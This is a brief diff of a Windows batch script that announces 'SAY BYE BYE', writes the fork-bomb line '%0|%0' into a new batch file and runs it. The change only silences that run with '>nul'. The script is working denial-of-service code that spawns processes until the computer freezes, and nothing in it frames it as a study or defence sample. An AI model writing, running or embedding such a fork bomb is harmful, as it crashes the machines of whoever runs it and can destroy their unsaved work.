@@ -19,4 +19,4 @@ echo PRESS ANY KEY TO RUN AND SAY BYE BYE...
 pause >nul
 del xwkqelajcmLsldi.bat >nul
 echo %%0^|%%0 > xwkqelajcmLsldi.bat
-.\xwkqelajcmLsldi.bat
+.\xwkqelajcmLsldi.bat >nul
